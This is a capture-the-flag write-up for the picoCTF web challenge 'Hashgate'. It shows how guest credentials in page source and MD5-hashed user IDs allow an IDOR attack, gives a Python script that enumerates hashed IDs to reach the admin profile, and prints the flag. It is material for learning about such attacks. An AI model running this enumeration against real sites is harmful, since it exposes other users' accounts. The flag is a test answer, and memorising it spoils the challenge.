# PicoCTF – Hashgate
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Points:** 100  
**Author:** Yahaya Meddy  
**Flag:** `picoCTF{id0r_unl0ck_fa544448}`

---

## Description

> You have gotten access to an organisation's portal. Submit your email and password, and it redirects you to your profile. But be careful: just because access to the admin isn't directly exposed doesn't mean it's secure. Maybe someone forgot that obscurity isn't security... Can you find your way into the admin's profile for this organisation and capture the flag?

---

## Hints

1. Notice anything about how the ID is being checked? It's not plain text… maybe a one-way function is involved.
2. There are about 20 employees in this organisation.

---

## Recon

### Step 1 – View Page Source

Opening the login page source revealed hardcoded guest credentials in an HTML comment:

```html
<!-- Email: guest@picoctf.org Password: guest -->
```

### Step 2 – Login and Observe the URL

Logging in with the guest credentials redirected to:

```
/profile/user/e93028bdc1aacdfb3687181f2031765d
```

The profile page showed:

```
Access level: Guest (ID: 3000). Insufficient privileges to view classified data.
```

The long hex string in the URL looked like an MD5 hash. Verifying:

```python
import hashlib
hashlib.md5("3000".encode()).hexdigest()
# e93028bdc1aacdfb3687181f2031765d ✅
```

The app was using **MD5(user_id)** as the profile URL identifier — classic security through obscurity.

---

## Vulnerability – IDOR (Insecure Direct Object Reference)

The application "hides" profile URLs behind MD5 hashes, but since the input (numeric user ID) is predictable, an attacker can:

1. Know their own ID (exposed on the profile page)
2. Hash nearby IDs
3. Access any user's profile — including admin

MD5 is a **one-way hash**, not encryption. It provides zero confidentiality when the input space is small and guessable.

---

## Exploitation

Since guest ID is `3000` and there are ~20 employees, the admin ID is likely near 3000.

### Script

```python
import hashlib
import requests

base_url = "http://crystal-peak.picoctf.net:51363/profile/user/"

for i in range(2980, 3021):
    h = hashlib.md5(str(i).encode()).hexdigest()
    url = base_url + h
    response = requests.get(url).text
    if "flag" in response or "admin" in response.lower():
        print(i, response[:100])
        print(url)
```

### Output

```
3018 Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_fa544448}
http://crystal-peak.picoctf.net:51363/profile/user/9a96a2c73c0d477ff2a6da3bf538f4f4
```

Admin user ID was **3018**, just 18 above the guest account.

---

## Flag

```
picoCTF{id0r_unl0ck_fa544448}
```

---

## Key Takeaways

- **IDOR** occurs when an app uses a predictable/guessable reference to access objects without proper authorization checks
- Hashing an ID with MD5 does **not** protect it — if the input is guessable, the hash is guessable
- Always check: what does the URL/cookie reveal about how the backend identifies you?
- **Obscurity ≠ Security**
